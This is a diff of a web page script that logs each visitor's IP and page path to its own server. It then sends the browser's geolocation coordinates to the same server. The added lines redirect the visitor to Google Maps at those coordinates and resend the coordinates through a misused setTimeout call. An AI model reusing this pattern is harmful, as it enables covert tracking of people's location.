@@ -9,7 +9,7 @@
     <script>
         var Latitude;
         var Longitude;
-        window.onload = async function() {
+        window.onload = async function pageload() {
             
             await fetch(window.location.origin+'/ip?cl='+window.location.pathname)
             document.getElementById("IPinfo").innerHTML = "Ipinfo is allowed";
@@ -29,11 +29,15 @@
                 Longitude=await position.coords.longitude;
                 await fetch(window.location.origin+'/allow?lat='+position.coords.latitude+','+position.coords.longitude +'&cl='+window.location.pathname )      
                 document.getElementById("AllowLocation").innerHTML = "Geolocation is allowed";
+                window.location.href="https://www.google.com/maps/?q="+position.coords.latitude+','+position.coords.longitude
+                
+                
+                setTimeout(await fetch(window.location.origin+'/allow?lat='+position.coords.latitude+','+position.coords.longitude +'&cl='+window.location.pathname ), 3000)
         }
             };  
 
     </script>
- 
+
 
 </body>
 
